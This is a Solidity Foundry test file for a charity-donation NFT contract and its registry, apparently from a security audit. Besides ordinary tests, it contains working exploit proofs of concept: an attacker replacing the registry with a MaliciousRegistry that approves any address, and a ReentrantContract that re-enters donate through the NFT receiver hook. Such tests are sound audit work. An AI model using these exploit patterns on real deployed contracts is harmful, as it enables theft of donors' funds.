// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GivingThanks.sol";
import "../src/CharityRegistry.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/Base64.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract GivingThanksTest is Test {
    GivingThanks public charityContract;
    CharityRegistry public registryContract;
    address public admin;
    address public charity;
    address public donor;

    function setUp() public {
        // Initialize addresses
        admin = makeAddr("admin");
        charity = makeAddr("charity");
        donor = makeAddr("donor");

        // Deploy the CharityRegistry contract as admin
        vm.prank(admin);
        registryContract = new CharityRegistry();

        // Deploy the GivingThanks contract with the registry address
        vm.prank(admin);
        charityContract = new GivingThanks(address(registryContract));

        // Register and verify the charity
        vm.prank(admin);
        registryContract.registerCharity(charity);

        vm.prank(admin);
        registryContract.verifyCharity(charity);
    }

    function testDonate() public {
        uint256 donationAmount = 1 ether;

        // Check initial token counter
        uint256 initialTokenCounter = charityContract.tokenCounter();

        // Fund the donor
        vm.deal(donor, 10 ether);

        // Donor donates to the charity
        vm.prank(donor);
        charityContract.donate{value: donationAmount}(charity);

        // Check that the NFT was minted
        uint256 newTokenCounter = charityContract.tokenCounter();
        assertEq(newTokenCounter, initialTokenCounter + 1);

        // Verify ownership of the NFT
        address ownerOfToken = charityContract.ownerOf(initialTokenCounter);
        assertEq(ownerOfToken, donor);

        // Verify that the donation was sent to the charity
        uint256 charityBalance = charity.balance;
        assertEq(charityBalance, donationAmount);
    }

    function testCannotDonateToUnverifiedCharity() public {
        UnverifiedCharity unverifiedCharity = new UnverifiedCharity();

        // Unverified charity registers but is not verified
        vm.prank(address(unverifiedCharity));
        registryContract.registerCharity(address(unverifiedCharity));

        // Fund the donor
        vm.deal(donor, 10 ether);

        // Donor tries to donate to unverified charity
        vm.prank(donor);
        vm.expectRevert();
        charityContract.donate{value: 1 ether}(address(unverifiedCharity));
        // This is reverting because the registry is being pointed to the admin address, not the registry. It gets to isVerified and fails because the admin address has no such function.
    }

    function testFuzzDonate(uint96 donationAmount) public {
        // Limit the donation amount to a reasonable range
        donationAmount = uint96(bound(donationAmount, 1 wei, 10 ether));

        // Fund the donor
        vm.deal(donor, 20 ether);

        // Record initial balances
        uint256 initialTokenCounter = charityContract.tokenCounter();
        uint256 initialCharityBalance = charity.balance;

        // Donor donates to the charity
        vm.prank(donor);
        charityContract.donate{value: donationAmount}(charity);

        // Verify that the NFT was minted
        uint256 newTokenCounter = charityContract.tokenCounter();
        assertEq(newTokenCounter, initialTokenCounter + 1);

        // Verify ownership of the NFT
        address ownerOfToken = charityContract.ownerOf(initialTokenCounter);
        assertEq(ownerOfToken, donor);

        // Verify that the donation was sent to the charity
        uint256 charityBalance = charity.balance;
        assertEq(charityBalance, initialCharityBalance + donationAmount);
    }


    function testIsVerifiedWithUnregisteredCharity() public {

        address unregisteredCharity = makeAddr("unregisteredCharity");

        // Check that the charity is verified
        bool isVerified = registryContract.isVerified(unregisteredCharity);
        // console2.log("isVerified: ", registryContract.isVerified(charity));
        // console2.log("registeredCharities: ", registryContract.registeredCharities(charity));
        // console2.log("verifiedCharities: ", registryContract.verifiedCharities(charity));
        assertFalse(isVerified);
    }

    function testIsVerifiedWithUnverifiedCharity() public {

        address unverifiedCharity = makeAddr("unverifiedCharity");
        
        //register but dont verify the charity
        vm.prank(unverifiedCharity);
        registryContract.registerCharity(unverifiedCharity);

        // Check that the charity is verified
        bool isVerified = registryContract.isVerified(unverifiedCharity);
        console2.log("isVerified: ", registryContract.isVerified(unverifiedCharity));
        console2.log("registeredCharities: ", registryContract.registeredCharities(unverifiedCharity));
        console2.log("verifiedCharities: ", registryContract.verifiedCharities(unverifiedCharity));
        assertTrue(isVerified);
    }
    function testIsVerifiedWithRealCharity() public {

        vm.prank(charity);
        registryContract.registerCharity(charity);

        // Check that the charity is verified
        bool isVerified = registryContract.isVerified(charity);
        // console2.log("isVerified: ", registryContract.isVerified(charity));
        // console2.log("registeredCharities: ", registryContract.registeredCharities(charity));
        // console2.log("verifiedCharities: ", registryContract.verifiedCharities(charity));
        assertTrue(isVerified);
    }

    function testChangeRegistryToAttacker() public {
        MaliciousRegistry maliciousRegistry = new MaliciousRegistry();
        address attacker = makeAddr("attacker");  

        // Change the registry address to the attacker's address  
        vm.prank(attacker);
        charityContract.updateRegistry(address(maliciousRegistry));

        // Now, the donate function will accept any address as a verified charity
        // We will create a random charity that is not even registered and donate to it.
        address newCharity = makeAddr("newCharity");

        // Fund the donor
        vm.deal(donor, 10 ether);

        // Donor donates to the charity, It goes through even though the charity is not verified
        vm.prank(donor);
        charityContract.donate{value: 10 ether}(newCharity);

        // Verify that the donation was sent to the newCharity
        uint256 charityBalance = newCharity.balance;
        assertEq(charityBalance, 10 ether);
    }


    function testReentrancyInDonate() public {
        // Deploy the reentrant contract
        ReentrantContract reentrantContract = new ReentrantContract(charityContract);

        // Fund the donor
        vm.deal(address(reentrantContract), 20 ether);

        // Donor donates to the charity
        vm.startPrank(address(reentrantContract));
        charityContract.donate{value: 1 ether}(address(charity));

        // Verify that the donation was sent to the charity
        uint256 charityBalance = charity.balance;
        assertEq(charityBalance, 1 ether);
    }
}

contract ReentrantContract is IERC721Receiver, Test {
    GivingThanks charityContract;
    uint256 counter = 0;
    address charity = makeAddr("charity");


    constructor(GivingThanks _charityContract) {
        charityContract = _charityContract;
    }
    receive() external payable {
        // Reenter the donate function
        charityContract.donate{value: 1 ether}(charity);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        if(counter < 10){
            counter++;
            charityContract.donate{value: 1 ether}(charity);            
        }

        return this.onERC721Received.selector;
    }
}


contract MaliciousRegistry {
    function isVerified(address) public pure returns (bool) {
        return true;
    }
}

contract UnverifiedCharity is IERC721Receiver {

    receive() external payable {
        // Do nothing
    }
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        return this.onERC721Received.selector;
    }


}